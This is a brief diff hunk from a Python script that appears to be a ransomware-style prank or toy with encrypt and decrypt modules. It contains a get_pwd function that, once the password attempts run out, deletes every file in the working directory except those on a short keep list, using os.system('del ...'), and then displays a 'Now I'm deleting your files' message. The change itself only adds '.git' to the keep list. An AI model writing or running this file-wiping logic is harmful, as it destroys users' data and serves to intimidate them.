@@ -39,7 +39,7 @@ def get_pwd():
         ent_data = set("This is your last chance!")
     elif tries ==0:
         for file in os.listdir():
-            if file not in ["env","enc_key","scripts","encrypt.py","__pycache__","decrypt.py","images","app.py","bye.py"]:
+            if file not in ["env","enc_key","scripts","encrypt.py","__pycache__","decrypt.py","images","app.py","bye.py",".git"]:
                 os.system(f'del {file}')
         os.system("python scripts/bye.py --image images/deleted.gif --text \"Now I'm deleting your files\"")
         
